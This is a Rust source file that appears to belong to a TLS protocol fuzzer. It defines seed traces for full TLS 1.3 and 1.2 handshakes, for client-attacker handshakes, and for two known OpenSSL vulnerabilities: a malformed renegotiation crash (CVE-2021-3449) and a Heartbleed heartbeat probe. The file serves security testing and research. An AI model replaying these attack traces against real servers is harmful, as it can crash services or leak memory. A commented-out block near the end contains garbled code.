//! Implementation of  special traces. Each may represent a special TLS execution like a full
//! handshake or an execution which crahes OpenSSL.

use rustls::msgs::handshake::CertificatePayload;
use rustls::msgs::message::Message;
use rustls::{
    internal::msgs::{
        enums::Compression,
        handshake::{ClientExtension, Random, ServerExtension, SessionID},
    },
    CipherSuite, ProtocolVersion,
};

use crate::agent::{AgentDescriptor, TLSVersion};
use crate::tls::fn_impl::*;
use crate::{
    agent::AgentName,
    term::{signature::Signature, Term},
    trace::{Action, InputAction, OutputAction, Step, Trace},
};
use crate::{app, app_const, term, var};


pub fn seed_successful(client: AgentName, server: AgentName) -> Trace {
    Trace {
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_3,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_3,
                server: true,
            },
        ],
        steps: vec![
            Step {
                agent: client,
                action: Action::Output(OutputAction { id: 0 }),
            },
            // Client Hello Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_client_hello),
                        vec![
                            Term::Variable(Signature::new_var::<ProtocolVersion>((0, 0))),
                            Term::Variable(Signature::new_var::<Random>((0, 0))),
                            Term::Variable(Signature::new_var::<SessionID>((0, 0))),
                            Term::Variable(Signature::new_var::<Vec<CipherSuite>>((0, 0))),
                            Term::Variable(Signature::new_var::<Vec<Compression>>((0, 0))),
                            Term::Variable(Signature::new_var::<Vec<ClientExtension>>((0, 0))),
                        ],
                    ),
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 1 }),
            },
            // Server Hello Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_server_hello),
                        vec![
                            Term::Variable(Signature::new_var::<ProtocolVersion>((1, 0))),
                            Term::Variable(Signature::new_var::<Random>((1, 0))),
                            Term::Variable(Signature::new_var::<SessionID>((1, 0))),
                            Term::Variable(Signature::new_var::<CipherSuite>((1, 0))),
                            Term::Variable(Signature::new_var::<Compression>((1, 0))),
                            Term::Variable(Signature::new_var::<Vec<ServerExtension>>((1, 0))),
                        ],
                    ),
                }),
            },
            // CCS Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_change_cipher_spec),
                        vec![],
                    ),
                }),
            },
            // Encrypted Extensions Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_application_data),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((1, 2)))],
                    ),
                }),
            },
            // Certificate Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_application_data),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((1, 3)))],
                    ),
                }),
            },
            // Certificate Verify Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_application_data),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((1, 4)))],
                    ),
                }),
            },
            // Finish Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_application_data),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((1, 5)))],
                    ),
                }),
            },
            Step {
                agent: client,
                action: Action::Output(OutputAction { id: 2 }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_change_cipher_spec),
                        vec![],
                    ),
                }),
            },
            // Finished Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_application_data),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((2, 1)))],
                    ),
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 3 }),
            },
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_application_data),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((3, 0)))],
                    ),
                }),
            },
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_application_data),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((3, 1)))],
                    ),
                }),
            },
        ],
    }
}

pub fn seed_successful12(client: AgentName, server: AgentName) -> Trace {
    Trace {
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
            },
        ],
        steps: vec![
            OutputAction::new_step(client, 0),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((0, 0)/ProtocolVersion),
                        ((0, 0)/Random),
                        ((0, 0)/SessionID),
                        ((0, 0)/Vec<CipherSuite>),
                        ((0, 0)/Vec<Compression>),
                        ((0, 0)/Vec<ClientExtension>)
                    )
                },
            ),
            OutputAction::new_step(server, 1),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((1, 0)/ProtocolVersion),
                            ((1, 0)/Random),
                            ((1, 0)/SessionID),
                            ((1, 0)/CipherSuite),
                            ((1, 0)/Compression),
                            ((1, 0)/Vec<ServerExtension>)
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_certificate),
                        vec![Term::Variable(Signature::new_var::<CertificatePayload>((
                            1, 1,
                        )))],
                    ),
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_server_key_exchange),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((1, 2)))],
                    ),
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_server_hello_done),
                        vec![],
                    ),
                }),
            },
            Step {
                agent: client,
                action: Action::Output(OutputAction { id: 2 }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_client_key_exchange),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((2, 0)))],
                    ),
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_change_cipher_spec).clone(),
                        vec![],
                    ),
                }),
            },
            // Client Handshake Finished, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_opaque_handshake_message),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((2, 2)))],
                    ),
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 3 }),
            },
            // Server Change Cipher Spec, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_change_cipher_spec),
                        vec![],
                    ),
                }),
            },
            // Server Handshake Finished, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: Term::Application(
                        Signature::new_function(&fn_opaque_handshake_message),
                        vec![Term::Variable(Signature::new_var::<Vec<u8>>((3, 1)))],
                    ),
                }),
            },
        ],
    }
}

pub fn seed_client_attacker(client: AgentName, server: AgentName) -> Trace {
    let client_hello = app!(
        fn_client_hello,
        app_const!(fn_protocol_version12),
        app_const!(fn_new_random),
        app_const!(fn_new_session_id),
        app_const!(fn_new_cipher_suites),
        app_const!(fn_compressions),
        app!(
            fn_client_extensions_append,
            app!(
                fn_client_extensions_append,
                app!(
                    fn_client_extensions_append,
                    app!(
                        fn_client_extensions_append,
                        app_const!(fn_client_extensions_new),
                        app_const!(fn_secp384r1_support_group_extension),
                    ),
                    app_const!(fn_signature_algorithm_extension)
                ),
                app_const!(fn_key_share_extension)
            ),
            app_const!(fn_supported_versions13_extension)
        ),
    );

    let server_hello_transcript = app!(
        fn_append_transcript,
        app!(
            fn_append_transcript,
            app_const!(fn_new_transcript),
            client_hello.clone(), // ClientHello
        ),
        var!(Message, (0, 0)), // plaintext ServerHello
    );

    let encrypted_extensions = app!(
        fn_decrypt,
        var!(Message, (0, 2)), // Encrypted Extensions
        var!(Vec<ServerExtension>, (0, 0)),
        server_hello_transcript.clone(),
        app_const!(fn_seq_0), // sequence 0
    );

    let encrypted_extension_transcript = app!(
        fn_append_transcript,
        server_hello_transcript.clone(),
        encrypted_extensions.clone() // plaintext Encrypted Extensions
    );
    let server_certificate = app!(
        fn_decrypt,
        var!(Message, (0, 3)), // Server Certificate
        var!(Vec<ServerExtension>, (0, 0)),
        server_hello_transcript.clone(),
        app_const!(fn_seq_1), // sequence 1
    );

    let server_certificate_transcript = app!(
        fn_append_transcript,
        encrypted_extension_transcript.clone(),
        server_certificate.clone() // plaintext Server Certificate
    );

    let server_certificate_verify = app!(
        fn_decrypt,
        var!(Message, (0, 4)), // Server Certificate Verify
        var!(Vec<ServerExtension>, (0, 0)),
        server_hello_transcript.clone(),
        app_const!(fn_seq_2) // sequence 2
    );

    let server_certificate_verify_transcript = app!(
        fn_append_transcript,
        server_certificate_transcript.clone(),
        server_certificate_verify.clone() // plaintext Server Certificate Verify
    );

    let server_finished = app!(
        fn_decrypt,
        var!(Message, (0, 5)), // Server Handshake Finished
        var!(Vec<ServerExtension>, (0, 0)),
        server_hello_transcript.clone(),
        app_const!(fn_seq_3) // sequence 3
    );

    let server_finished_transcript = app!(
        fn_append_transcript,
        server_certificate_verify_transcript.clone(),
        server_finished.clone(), // plaintext Server Handshake Finished
    );

    let trace = Trace {
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_3,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_3,
                server: true,
            },
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello.clone(),
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 0 }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: app!(
                        fn_encrypt,
                        app!(
                            fn_finished,
                            app!(
                                fn_verify_data,
                                var!(Vec<ServerExtension>, (0, 0)),
                                server_finished_transcript.clone(),
                                server_hello_transcript.clone()
                            )
                        ),
                        var!(Vec<ServerExtension>, (0, 0)),
                        server_hello_transcript.clone(),
                        app_const!(fn_seq_0) // sequence 0
                    ),
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 1 }),
            },
        ],
    };

    trace
}

pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> Trace {
    _seed_client_attacker12(client, server).0
}

fn _seed_client_attacker12(client: AgentName, server: AgentName) -> (Trace, Term) {
    let client_hello = app!(
        fn_client_hello,
        app_const!(fn_protocol_version12),
        app_const!(fn_new_random),
        app_const!(fn_new_session_id),
        // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        app_const!(fn_new_cipher_suites12),
        app_const!(fn_compressions),
        app!(
            fn_client_extensions_append,
            app!(
                fn_client_extensions_append,
                app!(
                    fn_client_extensions_append,
                    app!(
                        fn_client_extensions_append,
                        app!(
                            fn_client_extensions_append,
                            app!(
                                fn_client_extensions_append,
                                app_const!(fn_client_extensions_new),
                                app_const!(fn_secp384r1_support_group_extension),
                            ),
                            app_const!(fn_signature_algorithm_extension)
                        ),
                        app_const!(fn_ec_point_formats_extension)
                    ),
                    app_const!(fn_signature_algorithm_cert_extension)
                ),
                app_const!(fn_signed_certificate_timestamp)
            ),
            // Enable Renegotiation
            app_const!(fn_renegotiation_info_initial_extension),
        )
    );

    let server_hello_transcript = app!(
        fn_append_transcript,
        app!(
            fn_append_transcript,
            app_const!(fn_new_transcript12),
            client_hello.clone(), // ClientHello
        ),
        var!(Message, (0, 0)), // plaintext ServerHello
    );

    let certificate_transcript = app!(
        fn_append_transcript,
        server_hello_transcript.clone(),
        var!(Message, (0, 1)), // Certificate
    );

    let server_key_exchange_transcript = app!(
        fn_append_transcript,
        certificate_transcript.clone(),
        var!(Message, (0, 2)), // ServerKeyExchange
    );

    let server_hello_done_transcript = app!(
        fn_append_transcript,
        server_key_exchange_transcript.clone(),
        var!(Message, (0, 3)), // ServerHelloDone
    );

    let client_key_exchange = app!(
        fn_client_key_exchange,
        app!(
            fn_new_pubkey12,
            app!(fn_decode_ecdh_params, var!(Vec<u8>, (0, 2)))
        )
    );

    let client_key_exchange_transcript = app!(
        fn_append_transcript,
        server_hello_done_transcript.clone(),
        client_key_exchange.clone()
    );

    let client_verify_data = app!(
        fn_sign_transcript,
        var!(Random, (0, 0)),
        app!(fn_decode_ecdh_params, var!(Vec<u8>, (0, 2))), // ServerECDHParams
        client_key_exchange_transcript.clone()
    );

    let trace = Trace {
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
            },
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello.clone(),
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 0 }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_key_exchange.clone(),
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: app_const!(fn_change_cipher_spec),
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: app!(
                        fn_encrypt12,
                        app!(fn_finished, client_verify_data.clone()),
                        var!(Random, (0, 0)),
                        app!(fn_decode_ecdh_params, var!(Vec<u8>, (0, 2))), // ServerECDHParams
                        app_const!(fn_seq_0)
                    ),
                }),
            },
        ],
    };

    (trace, client_verify_data)
}

pub fn seed_cve_2021_3449(client: AgentName, server: AgentName) -> Trace {
    let (mut trace, client_verify_data) = _seed_client_attacker12(client, server);

    let renegotiation_client_hello = app!(
        fn_client_hello,
        app_const!(fn_protocol_version12),
        app_const!(fn_new_random),
        app_const!(fn_new_session_id),
        // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        app_const!(fn_new_cipher_suites12),
        app_const!(fn_compressions),
        app!(
            fn_client_extensions_append,
            app!(
                fn_client_extensions_append,
                app!(
                    fn_client_extensions_append,
                    app!(
                        fn_client_extensions_append,
                        app_const!(fn_client_extensions_new),
                        app_const!(fn_secp384r1_support_group_extension),
                    ),
                    app_const!(fn_ec_point_formats_extension)
                ),
                app_const!(fn_signature_algorithm_cert_extension)
            ),
            // Enable Renegotiation
            app!(fn_renegotiation_info_extension, client_verify_data),
        )
    );

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: app!(
                fn_encrypt12,
                renegotiation_client_hello.clone(),
                var!(Random, (0, 0)),
                app!(fn_decode_ecdh_params, var!(Vec<u8>, (0, 2))), // ServerECDHParams
                app_const!(fn_seq_1)
            ),
        }),
    });

    /*
    trace.stepSignature::push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: app!(

                op_encrypt12,
                app_const!(op_alert_close_notify),
                var!(Random, (0, 0)),
                app!(op_decode_ecdh_paramvar!(Vec<u8>, (0, 2))), // ServerECDHParams
                app_const!(op_seq_1)
            ),
        }),
    });
    */

    trace
}


pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace {
    let client_hello = app!(
        fn_client_hello,
        app_const!(fn_protocol_version12),
        app_const!(fn_new_random),
        app_const!(fn_new_session_id),
        // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        app_const!(fn_new_cipher_suites12),
        app_const!(fn_compressions),
            app!(
                fn_client_extensions_append,
                app!(
                    fn_client_extensions_append,
                    app!(
                        fn_client_extensions_append,
                        app!(
                            fn_client_extensions_append,
                            app!(
                                fn_client_extensions_append,
                                app_const!(fn_client_extensions_new),
                                app_const!(fn_secp384r1_support_group_extension),
                            ),
                            app_const!(fn_signature_algorithm_extension)
                        ),
                        app_const!(fn_ec_point_formats_extension)
                    ),
                    app_const!(fn_signature_algorithm_cert_extension)
                ),
                app_const!(fn_signed_certificate_timestamp)
            )
    );


    let trace = Trace {
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
            },
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello,
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: app_const!(fn_heartbeat),
                }),
            }
        ],
    };

    trace
}
